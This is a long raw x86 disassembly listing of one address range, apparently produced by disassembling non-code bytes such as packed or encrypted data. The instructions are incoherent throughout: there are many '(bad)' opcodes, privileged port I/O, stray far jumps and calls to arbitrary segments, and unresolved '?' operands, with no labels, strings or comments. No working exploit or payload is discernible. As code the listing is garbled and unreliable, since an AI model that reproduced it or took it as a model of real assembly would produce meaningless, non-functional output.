  41f251:	out    dx,al
  41f252:	sbb    bl,bl
  41f254:	sti    
  41f255:	pop    ecx
  41f256:	jo     0x41f1ea
  41f258:	mov    ebp,0x16acd25d
  41f25d:	and    eax,DWORD PTR [ecx-0x3c]
  41f260:	mov    esp,0x58d0ed52
  41f265:	inc    ebp
  41f266:	mov    esi,0x19a440fc
  41f26b:	mov    edx,?
  41f26d:	or     esi,eax
  41f26f:	mov    eax,ds:0x9ace9c37
  41f274:	ss lahf 
  41f276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f277:	mov    bh,0x91
  41f279:	out    dx,al
  41f27a:	pop    edx
  41f27b:	mov    al,0x8d
  41f27d:	cs jne 0x41f2c1
  41f280:	xor    DWORD PTR [ebp-0x71],esp
  41f283:	aas    
  41f284:	mov    ?,WORD PTR [edx]
  41f286:	iret   
  41f287:	gs adc eax,0x9a8889a
  41f28d:	addr16 sahf 
  41f28f:	sbb    eax,0x5613401d
  41f294:	gs loop 0x41f22d
  41f297:	fdiv   DWORD PTR [esi]
  41f299:	in     al,0x9d
  41f29b:	jmp    0x41f28c
  41f29d:	cs in  al,dx
  41f29f:	das    
  41f2a0:	(bad)  
  41f2a2:	dec    edx
  41f2a3:	and    cl,BYTE PTR [ebx-0x1a]
  41f2a6:	loopne 0x41f281
  41f2a8:	cmc    
  41f2a9:	mov    cl,0x2d
  41f2ab:	cdq    
  41f2ac:	xlat   BYTE PTR ds:[ebx]
  41f2ad:	lods   al,BYTE PTR ds:[esi]
  41f2ae:	inc    ebp
  41f2af:	scas   eax,DWORD PTR es:[edi]
  41f2b0:	ror    ecx,1
  41f2b2:	mov    esi,0xbf2b158c
  41f2b7:	or     BYTE PTR [ecx*2-0x6304126b],bl
  41f2be:	retf   
  41f2bf:	bound  ebp,QWORD PTR [ecx+edx*1]
  41f2c2:	bound  esp,QWORD PTR [ebx-0x113f0cb7]
  41f2c8:	int    0x5
  41f2ca:	rcr    DWORD PTR [edx+ebx*1+0x5a],0xdf
  41f2cf:	xor    eax,0x9596f229
  41f2d4:	outs   dx,DWORD PTR ds:[esi]
  41f2d5:	imul   edi,DWORD PTR [edx],0x43
  41f2d8:	jbe    0x41f2e2
  41f2da:	jg     0x41f30d
  41f2dc:	ror    DWORD PTR [esi-0x57f94459],0xe
  41f2e3:	push   esi
  41f2e4:	(bad)  
  41f2e5:	dec    ebx
  41f2e6:	inc    ebp
  41f2e7:	xchg   edx,eax
  41f2e8:	mov    ecx,edx
  41f2ea:	icebp  
  41f2eb:	arpl   WORD PTR [edi],dx
  41f2ed:	inc    edx
  41f2ee:	sbb    ebx,DWORD PTR [edi+esi*4-0x199c0600]
  41f2f5:	push   ebp
  41f2f6:	xor    al,0x6e
  41f2f8:	cmp    eax,DWORD PTR [ebx-0x59]
  41f2fb:	xchg   ebx,eax
  41f2fc:	ja     0x41f2e5
  41f2fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2ff:	lock out 0x1f,al
  41f302:	mov    eax,0x16f7dffe
  41f307:	mov    eax,ds:0xdbd6ed43
  41f30c:	push   eax
  41f30d:	cwde   
  41f30e:	cwde   
  41f30f:	jbe    0x41f2c0
  41f311:	cmp    esp,DWORD PTR [ebx-0x1d2ed363]
  41f317:	adc    eax,0xb2f63bfc
  41f31c:	xor    eax,0x117f9678
  41f321:	adc    BYTE PTR [esi],al
  41f323:	cwde   
  41f324:	data16 sti 
  41f326:	inc    DWORD PTR [edx+ecx*4]
  41f329:	or     BYTE PTR [esi],0xc2
  41f32c:	and    ebp,esi
  41f32e:	int    0x6d
  41f330:	dec    esp
  41f331:	jne    0x41f338
  41f333:	inc    ebp
  41f334:	dec    eax
  41f335:	cmp    dh,BYTE PTR [ebp+0x8705cb]
  41f33b:	pop    esi
  41f33c:	into   
  41f33d:	bound  eax,QWORD PTR [esi+ecx*4+0xd8e25]
  41f344:	or     dl,BYTE PTR [edi+0x5bcd77c3]
  41f34a:	mov    gs,WORD PTR [edi+0x31dbcca]
  41f350:	repz push cs
  41f352:	in     eax,0x6f
  41f354:	popf   
  41f355:	int    0xf8
  41f357:	adc    BYTE PTR [esi],ah
  41f359:	xchg   ebp,eax
  41f35a:	stc    
  41f35b:	aam    0x4b
  41f35d:	pop    edx
  41f35e:	pop    es
  41f35f:	and    BYTE PTR cs:[edx+eiz*8],dl
  41f363:	dec    eax
  41f364:	rol    BYTE PTR [edi],1
  41f366:	dec    ebx
  41f367:	mov    eax,ds:0x4a3383cb
  41f36c:	add    ebx,ebp
  41f36e:	ja     0x41f3ed
  41f370:	add    al,dl
  41f372:	pop    esi
  41f373:	inc    ebx
  41f374:	rcl    DWORD PTR [esi+ebx*8+0x69c0cad1],0x1f
  41f37c:	mov    ?,WORD PTR [ebp+0x5cd4e5c1]
  41f382:	cmc    
  41f383:	(bad)  
  41f385:	pop    es
  41f386:	jle    0x41f35b
  41f388:	in     eax,dx
  41f389:	jg     0x41f348
  41f38b:	daa    
  41f38c:	pop    edi
  41f38d:	cdq    
  41f38e:	test   BYTE PTR ds:0xdf7c3252,dl
  41f394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f395:	sahf   
  41f396:	cmc    
  41f397:	mov    ebx,0x9693770e
  41f39c:	mov    ah,0x61
  41f39e:	mov    DWORD PTR ds:0x613dcc4d,esp
  41f3a4:	fchs   
  41f3a6:	pusha  
  41f3a7:	stos   BYTE PTR es:[edi],al
  41f3a8:	lock mov esi,0xcafb424a
  41f3ae:	inc    BYTE PTR [ecx+0x6ba8833e]
  41f3b4:	push   ss
  41f3b5:	call   0x6f4:0x323c777
  41f3bc:	bswap  esi
  41f3be:	inc    ecx
  41f3bf:	stc    
  41f3c0:	push   ebp
  41f3c1:	dec    ecx
  41f3c2:	jbe    0x41f3cf
  41f3c4:	outs   dx,BYTE PTR ds:[esi]
  41f3c5:	(bad)  
  41f3c6:	imul   ecx,DWORD PTR [edx-0x587c874c],0xc9052dcc
  41f3d0:	pop    esi
  41f3d1:	(bad)  
  41f3d2:	mov    ecx,0x36197551
  41f3d7:	jbe    0x41f456
  41f3d9:	aad    0xdb
  41f3db:	(bad)  
  41f3dc:	enter  0x18e4,0xf3
  41f3e0:	jb     0x41f453
  41f3e2:	hlt    
  41f3e3:	mov    DWORD PTR [edi+ebx*8+0x5c],ebp
  41f3e7:	mov    DWORD PTR [esi+edx*4-0x2581b1b9],ebp
  41f3ee:	pop    ecx
  41f3ef:	test   eax,0x1aa33bc1
  41f3f4:	xlat   BYTE PTR ds:[ebx]
  41f3f5:	push   ebx
  41f3f6:	jo     0x41f3a8
  41f3f8:	cld    
  41f3f9:	jb     0x41f3d2
  41f3fb:	push   0xffffffbf
  41f3fd:	icebp  
  41f3fe:	xlat   BYTE PTR ds:[ebx]
  41f3ff:	out    dx,al
  41f400:	xchg   edi,eax
  41f401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f402:	add    eax,0x32be8055
  41f407:	push   ecx
  41f408:	xor    eax,0x5c775938
  41f40d:	enter  0x2f71,0x9e
  41f411:	gs das 
  41f413:	cmp    ebx,DWORD PTR [eax-0x432ca5ff]
  41f419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f41a:	xor    ecx,ebx
  41f41c:	or     BYTE PTR cs:[esi+0x7b9749db],cl
  41f423:	into   
  41f424:	sub    eax,0x9b79af00
  41f429:	cs (bad) 
  41f42b:	jmp    0x41f3bc
  41f42d:	scas   al,BYTE PTR es:[edi]
  41f42e:	mov    ebx,0xf9dcb544
  41f433:	and    BYTE PTR [edx+eiz*2-0x54],bl
  41f437:	sar    DWORD PTR [ecx],0x6c
  41f43a:	mov    DWORD PTR [ebx],0x32e67841
  41f440:	cmp    eax,0x31aaafed
  41f445:	push   edi
  41f446:	outs   dx,BYTE PTR ds:[esi]
  41f447:	add    eax,0xcab97ea2
  41f44c:	(bad)  
  41f44d:	leave  
  41f44e:	jp     0x41f4a6
  41f450:	dec    eax
  41f451:	aas    
  41f452:	addr16 ja 0x41f47b
  41f455:	stc    
  41f456:	dec    edx
  41f457:	(bad)  
  41f458:	adc    BYTE PTR [ebx+0x20],dl
  41f45b:	popa   
  41f45c:	sbb    DWORD PTR [edx+esi*2-0x7f],esi
  41f460:	test   al,0x25
  41f462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f463:	es cs or eax,0x64c40817
  41f46a:	test   BYTE PTR [ecx+0x12],ch
  41f46d:	adc    DWORD PTR [esi],esp
  41f46f:	xor    al,0x30
  41f471:	adc    eax,0x66cdfd84
  41f476:	jmp    0xd375ef49
  41f47b:	(bad)  
  41f47c:	lahf   
  41f47d:	aad    0xf7
  41f47f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f480:	mov    cl,BYTE PTR [ebp-0x1a]
  41f483:	cli    
  41f484:	fwait
  41f485:	xchg   esp,eax
  41f486:	ins    BYTE PTR es:[edi],dx
  41f487:	inc    ecx
  41f488:	add    BYTE PTR [esi],bl
  41f48a:	scas   al,BYTE PTR es:[edi]
  41f48b:	and    al,0xc7
  41f48d:	push   edx
  41f48e:	shl    BYTE PTR [edx+esi*4-0x2b9dc10],0x66
  41f496:	fs jle 0x41f4f9
  41f499:	fcomip st,st(3)
  41f49b:	cmp    bl,BYTE PTR [esi]
  41f49d:	ja     0x41f429
  41f49f:	and    eax,0xad39193f
  41f4a4:	(bad)
  41f4a9:	(bad)  
  41f4aa:	jge    0x41f47b
  41f4ac:	lahf   
  41f4ad:	jp     0x41f43b
  41f4af:	stos   BYTE PTR es:[edi],al
  41f4b0:	stos   BYTE PTR es:[edi],al
  41f4b1:	adc    al,dl
  41f4b3:	arpl   WORD PTR [edx-0x15],bp
  41f4b6:	daa    
  41f4b7:	je     0x41f504
  41f4b9:	mov    ah,dh
  41f4bb:	or     al,0x9b
  41f4bd:	or     eax,0x2273be09
  41f4c2:	bound  ebp,QWORD PTR [esi]
  41f4c4:	fwait
  41f4c5:	xchg   esp,eax
  41f4c6:	and    esp,esi
  41f4c8:	dec    ebx
  41f4c9:	lods   eax,DWORD PTR ds:[esi]
  41f4ca:	mov    es,WORD PTR [esi-0xc]
  41f4cd:	mov    ebx,0x6f76b5af
  41f4d2:	frstor [esi-0x64dffabf]
  41f4d8:	pop    ss
  41f4d9:	fsubr  QWORD PTR [ecx]
  41f4db:	(bad)  
  41f4dc:	iret   
  41f4dd:	mov    ebx,0x22a6e940
  41f4e2:	sbb    edx,eax
  41f4e4:	(bad)  
  41f4e5:	out    dx,eax
  41f4e6:	mov    BYTE PTR [eax+0x74],dh
  41f4e9:	xlat   BYTE PTR ds:[ebx]
  41f4ea:	or     eax,0xb65c90cf
  41f4ef:	fwait
  41f4f0:	dec    ebp
  41f4f1:	jae    0x41f48a
  41f4f3:	retf   
  41f4f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4f5:	retf   0xd980
  41f4f8:	cs push eax
  41f4fa:	xchg   esi,eax
  41f4fb:	enter  0x7ef,0x9f
  41f4ff:	ds adc al,0x1e
  41f502:	jp     0x41f4a1
  41f504:	(bad)  
  41f505:	mov    es,WORD PTR [ebx-0x5623ebf]
  41f50b:	lahf   
  41f50c:	dec    ecx
  41f50d:	aam    0xc6
  41f50f:	add    eax,0x6af0dc8b
  41f514:	or     al,BYTE PTR [eax+0x2c]
  41f517:	xchg   edi,eax
  41f518:	cmp    eax,0x56248693
  41f51d:	or     eax,0x20b698bb
  41f522:	sar    BYTE PTR [ebx+0x23],cl
  41f525:	mov    DWORD PTR [esi+edx*2],ecx
  41f528:	imul   esi,DWORD PTR [edx-0x6b7bd658],0x974e5dfc
  41f532:	mov    esi,0x8a01d13d
  41f537:	sbb    DWORD PTR [esi],ebp
  41f539:	fwait
  41f53a:	jo     0x41f553
  41f53c:	sbb    BYTE PTR [ebx-0x77849f9c],bh
  41f542:	(bad)  
  41f543:	aad    0x88
  41f545:	popf   
  41f546:	mov    dh,0x3e
  41f548:	and    eax,0x70f5b800
  41f54d:	pop    ebx
  41f54e:	sbb    dh,BYTE PTR [ebx]
  41f550:	(bad)  
  41f551:	ja     0x41f580
  41f553:	aam    0x8a
  41f555:	loopne 0x41f567
  41f557:	scas   eax,DWORD PTR es:[edi]
  41f558:	jb     0x41f59d
  41f55a:	xchg   edx,eax
  41f55b:	sti    
  41f55c:	xchg   ecx,eax
  41f55d:	hlt    
  41f55e:	fwait
  41f55f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f560:	stos   DWORD PTR es:[edi],eax
  41f561:	aam    0x2f
  41f563:	repz out dx,eax
  41f565:	hlt    
  41f566:	pop    edx
  41f567:	adc    eax,0xcfb0524
  41f56c:	xor    edx,DWORD PTR [ecx-0x2d906f05]
  41f572:	inc    ecx
  41f573:	push   edx
  41f574:	imul   edi,DWORD PTR [ebx-0x67],0x3f
  41f578:	mov    al,0xb6
  41f57a:	cmp    dl,al
  41f57c:	ficom  WORD PTR ds:0xe4e02f86
  41f583:	out    dx,al
  41f584:	ins    BYTE PTR es:[edi],dx
  41f585:	in     eax,0xcd
  41f587:	xchg   esp,eax
  41f588:	nop
  41f589:	les    edi,FWORD PTR [edx]
  41f58b:	jns    0x41f576
  41f58d:	sub    eax,DWORD PTR ds:0xb6a42130
  41f593:	fimul  DWORD PTR [ecx-0x59]
  41f596:	pop    edx
  41f597:	stc    
  41f598:	in     eax,dx
  41f599:	lods   al,BYTE PTR ds:[esi]
  41f59a:	lahf   
  41f59b:	shl    BYTE PTR [ecx+0x56840d47],0x17
  41f5a2:	out    0xa1,eax
  41f5a4:	stc    
  41f5a5:	xlat   BYTE PTR ds:[ebx]
  41f5a6:	cwde   
  41f5a7:	xor    BYTE PTR ds:0x80fe8f2a,0x35
  41f5ae:	xor    al,BYTE PTR [edi]
  41f5b0:	sub    BYTE PTR [ebx+edx*2],dl
  41f5b3:	call   0x5f186e7a
  41f5b8:	ds scas al,BYTE PTR es:[edi]
  41f5ba:	pusha  
  41f5bb:	inc    eax
  41f5bc:	inc    ecx
  41f5bd:	add    DWORD PTR [edi-0x3e],edx
  41f5c0:	sub    al,0x98
  41f5c2:	retf   
  41f5c3:	adc    edx,DWORD PTR [edi+0x66]
  41f5c6:	icebp  
  41f5c7:	shr    DWORD PTR [esi-0x5c9f4a2],cl
  41f5cd:	mov    dl,0xe
  41f5cf:	xchg   esp,eax
  41f5d0:	or     ax,cx
  41f5d3:	jmp    0x180e:0x767ba875
  41f5da:	(bad)  
  41f5db:	jo     0x41f5cd
  41f5dd:	loopne 0x41f59e
  41f5df:	add    DWORD PTR [eax],edx
  41f5e1:	mov    edx,0xef4c7027
  41f5e6:	mov    ecx,DWORD PTR [esi]
  41f5e8:	stc    
  41f5e9:	pop    es
  41f5ea:	ins    BYTE PTR es:[edi],dx
  41f5eb:	imul   ebp,edi,0x14f517ec
  41f5f1:	popa   
  41f5f2:	pop    ds
  41f5f3:	and    ch,BYTE PTR [ecx+0x5d]
  41f5f6:	daa    
  41f5f7:	pushf  
  41f5f8:	push   0xffffff99
  41f5fa:	sbb    ebp,ebx
  41f5fc:	mov    ah,0xb2
  41f5fe:	pop    edx
  41f5ff:	test   al,0x80
  41f601:	push   esi
  41f602:	mov    esp,0xb401baf
  41f607:	jo     0x41f624
  41f609:	push   ds
  41f60a:	in     eax,0x64
  41f60c:	in     eax,0x82
  41f60e:	xchg   edx,eax
  41f60f:	(bad)  
  41f610:	call   0x33474234
  41f615:	mov    ecx,0xe24ea741
  41f61a:	sahf   
  41f61b:	mov    ebx,ebp
  41f61d:	and    eax,0xeefd6b33
  41f622:	call   0xc533a66e
  41f627:	adc    DWORD PTR [esi+0x45054229],0x43f873be
  41f631:	and    al,0xd1
  41f633:	clc    
  41f634:	out    dx,eax
  41f635:	pop    es
  41f636:	ffree  st(7)
  41f638:	or     al,0x54
  41f63a:	test   DWORD PTR [edx-0x1b6df37e],esi
  41f640:	cdq    
  41f641:	(bad)  
  41f642:	mov    ecx,0x7a3c281c
  41f647:	and    al,BYTE PTR [ebp-0x20]
  41f64a:	and    al,0xc8
  41f64c:	loop   0x41f5ed
  41f64e:	sti    
  41f64f:	stc    
  41f650:	jae    0x41f690
  41f652:	pop    eax
  41f653:	xchg   DWORD PTR [ecx+0x7c],eax
  41f656:	pop    esi
  41f657:	ficom  DWORD PTR [eax+0xcfc6059]
  41f65d:	aaa    
  41f65e:	mov    ecx,0xc87772f0
  41f663:	push   ebx
  41f664:	sbb    esi,DWORD PTR [esi+0x79a34a06]
  41f66a:	add    eax,0x3323a6a6
  41f66f:	add    BYTE PTR [ebp+0x5c],bh
  41f672:	xchg   ebp,eax
  41f673:	push   ds
  41f674:	adc    eax,0x5efede70
  41f679:	dec    edx
  41f67a:	push   0x62
  41f67c:	nop
  41f67d:	mov    cl,0xfb
  41f67f:	cmp    DWORD PTR ds:0x31aa6ad,eax
  41f685:	outs   dx,BYTE PTR ds:[esi]
  41f686:	jae    0x41f700
  41f688:	out    dx,al
  41f689:	and    al,0xd2
  41f68b:	jo     0x41f66a
  41f68d:	in     eax,0x32
  41f68f:	shrd   DWORD PTR [edx+0x18],eax,0x52
  41f694:	(bad)  
  41f695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f696:	outs   dx,DWORD PTR ds:[esi]
  41f697:	shl    BYTE PTR [edi-0x1f],1
  41f69a:	dec    ecx
  41f69b:	lock ins DWORD PTR es:[edi],dx
  41f69d:	adc    eax,0xb8243e86
  41f6a2:	cli    
  41f6a3:	(bad)  
  41f6a4:	mov    BYTE PTR [eax],0x9d
  41f6a7:	dec    ecx
  41f6a8:	push   edi
  41f6a9:	sahf   
  41f6aa:	cdq    
  41f6ab:	pop    ebp
  41f6ac:	or     al,0x94
  41f6ae:	cmp    eax,0xf3093b16
  41f6b3:	retf   
  41f6b4:	pop    ds
  41f6b5:	int    0x79
  41f6b7:	jbe    0x41f6a2
  41f6b9:	icebp  
  41f6ba:	rcr    BYTE PTR [edi-0x19],cl
  41f6bd:	in     eax,dx
  41f6be:	jmp    0xdbc2:0xa332de7e
  41f6c5:	call   0xda367f78
  41f6ca:	xor    eax,0x4abf1337
  41f6cf:	lods   al,BYTE PTR ds:[esi]
  41f6d0:	sbb    BYTE PTR [esi-0x162673ac],bh
  41f6d6:	sbb    al,0x50
  41f6d8:	fdiv   QWORD PTR [edi]
  41f6da:	out    0x47,eax
  41f6dc:	xor    ebx,DWORD PTR [edi+0x5072f355]
  41f6e2:	arpl   WORD PTR [ebx],di
  41f6e4:	push   edx
  41f6e5:	mov    ecx,0x6e545b7
  41f6ea:	aaa    
  41f6eb:	jno    0x41f71a
  41f6ed:	pusha  
  41f6ee:	xor    DWORD PTR [esi+0x2f],esi
  41f6f1:	dec    esi
  41f6f2:	adc    BYTE PTR [ebp-0x49ce5ad7],ah
  41f6f8:	cs push eax
  41f6fa:	pop    ecx
  41f6fb:	test   DWORD PTR [ecx],ebx
  41f6fd:	(bad)
  41f700:	stc    
  41f701:	adc    bh,BYTE PTR [ecx+0x201d910d]
  41f707:	scas   al,BYTE PTR es:[edi]
  41f708:	sub    eax,eax
  41f70a:	in     eax,0x5
  41f70c:	fldl2t 
  41f70e:	jge    0x41f6c5
  41f710:	xlat   BYTE PTR ds:[ebx]
  41f711:	add    cl,BYTE PTR [esi-0x26]
  41f714:	scas   al,BYTE PTR es:[edi]
  41f715:	cmp    al,0x78
  41f717:	mov    ?,ecx
  41f719:	add    BYTE PTR [ebx-0x5828c7e0],bl
  41f71f:	(bad)  
  41f721:	adc    BYTE PTR [edx+0xd],ah
  41f724:	and    ebx,edx
  41f726:	outs   dx,BYTE PTR gs:[esi]
  41f728:	retf   0x770
  41f72b:	stos   BYTE PTR es:[edi],al
  41f72c:	in     al,0x8d
  41f72e:	xor    cl,BYTE PTR [edi]
  41f730:	into   
  41f731:	xor    eax,0x549179fc
  41f736:	jmp    0x41f78f
  41f738:	mov    al,ds:0x1d50745f
  41f73d:	mov    ecx,0x8ea4dfea
  41f742:	inc    ecx
  41f743:	xchg   ebx,eax
  41f744:	inc    edx
  41f745:	or     eax,0xea7700fe
  41f74a:	fdivr  st(6),st
  41f74c:	test   BYTE PTR [ecx+ebx*2-0x7e],al
  41f750:	sbb    eax,0x8a0c288d
  41f755:	push   eax
  41f756:	in     al,0x6b
  41f758:	in     eax,dx
  41f759:	leave  
  41f75a:	out    0x86,al
  41f75c:	gs fucomp st(3)
  41f75f:	bound  esp,QWORD PTR [edx]
  41f761:	jns    0x41f77a
  41f763:	mov    ?,WORD PTR [edi-0x33]
  41f766:	std    
  41f767:	fdiv   DWORD PTR [edi+edi*1+0x2b04a2c5]
  41f76e:	or     al,0x31
  41f770:	nop
  41f771:	clc    
  41f772:	rol    DWORD PTR [eax],1
  41f774:	sbb    eax,0xe191b4db
  41f779:	adc    al,0x75
  41f77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f77c:	jg     0x41f7f1
  41f77e:	fcmovne st,st(3)
  41f780:	add    ch,bl
  41f782:	or     esp,ebx
  41f784:	pop    ebp
  41f785:	pop    ss
  41f786:	cmc    
  41f787:	lods   eax,DWORD PTR ds:[esi]
  41f788:	aas    
  41f789:	jl     0x41f7a9
  41f78b:	push   ebp
  41f78c:	mov    bh,0x2c
  41f78e:	sbb    eax,0xb05684f0
  41f793:	std    
  41f794:	push   esi
  41f795:	or     al,0xfb
  41f797:	ds retf 0x2464
  41f79b:	jbe    0x41f774
  41f79d:	sbb    DWORD PTR [ecx+edx*8],esi
  41f7a0:	pop    ebp
  41f7a1:	cmc    
  41f7a2:	pop    edx
  41f7a3:	pop    ebp
  41f7a4:	mov    edi,0x3e8b20e6
  41f7a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7aa:	pop    ecx
  41f7ab:	test   al,0xe5
  41f7ad:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41f7af:	adc    al,0x7f
  41f7b1:	rcl    dh,cl
  41f7b3:	ret    
  41f7b4:	mov    eax,0xc832296b
  41f7b9:	mov    DWORD PTR [edx-0x177bd04],0x9558f1c4
  41f7c3:	int    0xe9
  41f7c5:	jne    0x41f80d
  41f7c7:	call   ebx
  41f7c9:	xor    esi,DWORD PTR [esi+0x5d]
  41f7cc:	arpl   WORD PTR [esi],di
  41f7ce:	loop   0x41f77e
  41f7d0:	push   edx
  41f7d1:	dec    esp
  41f7d2:	push   eax
  41f7d3:	jns    0x41f851
  41f7d5:	push   ecx
  41f7d6:	stos   BYTE PTR es:[edi],al
  41f7d7:	in     al,0x4d
  41f7d9:	xchg   DWORD PTR [esi],ecx
  41f7db:	dec    esp
  41f7dc:	fsub   QWORD PTR [eax+0x79]
  41f7df:	push   ss
  41f7e0:	sub    edi,ebp
  41f7e2:	inc    edx
  41f7e3:	push   eax
  41f7e4:	test   eax,0xd9025dd3
  41f7e9:	and    al,0x96
  41f7eb:	fs stos BYTE PTR es:[edi],al
  41f7ed:	or     edx,DWORD PTR [edi-0x75c3c5fa]
  41f7f3:	call   0x7cd1:0xf2feb9ff
  41f7fa:	cmp    BYTE PTR [ebx*2+0x635ef9f7],bh
  41f801:	and    ebp,DWORD PTR [ebx-0x5a]
  41f804:	pop    edi
  41f805:	fidivr DWORD PTR [ebx-0x4d]
  41f808:	daa    
  41f809:	add    eax,0x55a7b531
  41f80e:	dec    edi
  41f80f:	in     al,dx
  41f810:	es jmp 0x65ca:0x29d4cc72
  41f818:	add    al,0xaa
  41f81a:	dec    edi
  41f81b:	stos   BYTE PTR es:[edi],al
  41f81c:	cmp    ch,BYTE PTR [ecx-0x3c]
  41f81f:	in     eax,0x74
  41f821:	add    eax,0xc5796086
  41f826:	fnstcw WORD PTR [ebp-0x68b237ab]
  41f82c:	push   es
  41f82d:	add    DWORD PTR [ebx+edx*4],esp
  41f830:	fsubr  st(7),st
  41f832:	push   edi
  41f833:	(bad)  
  41f835:	stc    
  41f836:	mov    ebx,0x581e7d98
  41f83b:	mov    eax,ds:0x8f5cb7cc
  41f840:	and    ebx,DWORD PTR [esi-0x16]
  41f843:	lea    esi,[eax-0x64a40963]
  41f849:	jg     0x41f892
  41f84b:	js     0x41f892
  41f84d:	or     bl,0x62
  41f850:	mov    dl,0x28
  41f852:	repnz pop ebp
  41f854:	hlt    
  41f855:	btc    esp,ecx
  41f858:	scas   eax,DWORD PTR es:[edi]
  41f859:	ret    
  41f85a:	and    bh,BYTE PTR [edx+0x45]
  41f85d:	cmp    edi,edx
  41f85f:	test   al,0xf9
  41f861:	and    DWORD PTR [esi],esp
  41f863:	mov    cs,WORD PTR [esi-0x49]
  41f866:	sbb    edi,DWORD PTR [esi-0x3822a3ac]
  41f86c:	popf   
  41f86d:	push   ecx
  41f86e:	xor    edx,DWORD PTR [eax-0x4b31f077]
  41f874:	adc    esp,edi
  41f876:	push   edx
  41f877:	dec    ebx
  41f878:	or     eax,0x2993ab8b
  41f87d:	sahf   
  41f87e:	cli    
  41f87f:	fist   DWORD PTR [esi+0x60]
  41f882:	cmp    BYTE PTR [edi-0x1c1cf98c],0x43
  41f889:	nop
  41f88a:	adc    DWORD PTR [edi],0xffffffdc
  41f88d:	retf   
  41f88e:	or     ah,BYTE PTR [ecx+0x950a8d2]
  41f894:	add    edx,eax
  41f896:	loopne 0x41f915
  41f898:	mov    ecx,0xead2a62c
  41f89d:	imul   esp,DWORD PTR [edx-0x26],0x1a3167e5
  41f8a4:	fsubr  DWORD PTR [edx]
  41f8a6:	adc    al,0xf9
  41f8a8:	popa   
  41f8a9:	test   al,0x16
  41f8ab:	jns    0x41f912
  41f8ad:	gs ret 
  41f8af:	sbb    eax,0xa5595a1c
  41f8b4:	in     al,0xea
  41f8b6:	cmp    al,0x66
  41f8b8:	mov    bl,0x8d
  41f8ba:	pop    ebp
  41f8bb:	mov    BYTE PTR [ebx+0x75b9687c],al
  41f8c1:	jle    0x41f847
  41f8c3:	mov    dl,0x2
  41f8c5:	push   cs
  41f8c6:	mov    esp,0x6a9f4057
  41f8cb:	pop    eax
  41f8cc:	jnp    0x41f8c3
  41f8ce:	loope  0x41f907
  41f8d0:	xor    DWORD PTR [eax],ecx
  41f8d2:	inc    ecx
  41f8d3:	fs dec edx
  41f8d5:	call   0x2a2ed356
  41f8da:	cld    
  41f8db:	push   ss
  41f8dc:	push   cs
  41f8dd:	cs daa 
  41f8df:	push   ds
  41f8e0:	jbe    0x41f8bf
  41f8e2:	jmp    0xc41c:0x77dc6528
  41f8e9:	inc    ecx
  41f8ea:	push   es
  41f8eb:	cmp    BYTE PTR [esi-0x38],bl
  41f8ee:	sbb    BYTE PTR [ebp+0x16],ah
  41f8f1:	or     DWORD PTR [ecx-0x76],ebp
  41f8f4:	leave  
  41f8f5:	adc    DWORD PTR [ebx+0x62],esp
  41f8f8:	and    esi,DWORD PTR [eax-0x6c]
  41f8fb:	push   ebp
  41f8fc:	cmp    BYTE PTR [edx+0x79613d31],cl
  41f902:	test   eax,0x76cb484f
  41f907:	push   eax
  41f908:	sub    BYTE PTR [ecx+eiz*2+0x20],al
  41f90c:	pop    ds
  41f90d:	test   DWORD PTR [edi],0x4b09cdae
  41f913:	pop    ebp
  41f914:	and    BYTE PTR [eax+0x49],bl
  41f917:	or     edi,DWORD PTR [eax+0x38]
  41f91a:	jmp    0x41f8ec
  41f91c:	jmp    0xee4d709f
  41f921:	push   ecx
  41f922:	sbb    al,0x9e
  41f924:	sbb    ebp,esi
  41f926:	xchg   edi,eax
  41f927:	mov    esp,0x6bdb90a0
  41f92c:	mov    esp,0xc46d8255
  41f931:	mov    dh,BYTE PTR [edx]
  41f933:	lock and DWORD PTR [ebx],edx
  41f936:	inc    ebp
  41f937:	(bad)  
  41f938:	cmp    al,0x2f
  41f93a:	and    al,0x21
  41f93c:	stos   BYTE PTR es:[edi],al
  41f93d:	cmc    
  41f93e:	bound  esi,QWORD PTR [esi]
  41f940:	gs out dx,al
  41f942:	or     BYTE PTR [edx+0x72],bh
  41f945:	out    0x93,al
  41f947:	stc    
  41f948:	aas    
  41f949:	dec    edi
  41f94a:	jp     0x41f913
  41f94c:	cmc    
  41f94d:	js     0x41f978
  41f94f:	fnstcw WORD PTR [edx+0x5b]
  41f952:	fdiv   QWORD PTR [esp+edx*4]
  41f955:	xor    esi,DWORD PTR [edi]
  41f957:	test   eax,0x67ac06d6
  41f95c:	adc    BYTE PTR [eax-0x17b5727f],dl
  41f962:	mov    ecx,0xbfb311ef
  41f967:	std    
  41f968:	scas   al,BYTE PTR es:[edi]
  41f969:	(bad)
  41f96d:	(bad)  
  41f96f:	mov    bh,0x84
  41f971:	cmp    BYTE PTR [edx-0x1b],bl
  41f974:	or     al,ch
  41f976:	inc    ebp
  41f977:	out    dx,al
  41f978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f979:	inc    ebx
  41f97a:	push   eax
  41f97b:	iret   
  41f97c:	les    ecx,FWORD PTR [esi]
  41f97e:	cmp    DWORD PTR [esi+0x54],esi
  41f981:	cmp    DWORD PTR [esi+edi*8+0x27aff5bd],ebp
  41f988:	outs   dx,BYTE PTR ds:[esi]
  41f989:	sub    edi,DWORD PTR [eax-0x731d7211]
  41f98f:	pop    esp
  41f990:	rcl    DWORD PTR [eax],cl
  41f992:	jns    0x41fa0c
  41f994:	sar    DWORD PTR [ebx+0x7],cl
  41f997:	sbb    eax,0xb68e0503
  41f99c:	cdq    
  41f99d:	out    0x80,eax
  41f99f:	mov    ds:0x685a80ae,al
  41f9a4:	stos   BYTE PTR es:[edi],al
  41f9a5:	jmp    0x725b:0xae512d7a
  41f9ac:	push   ss
  41f9ad:	(bad)  
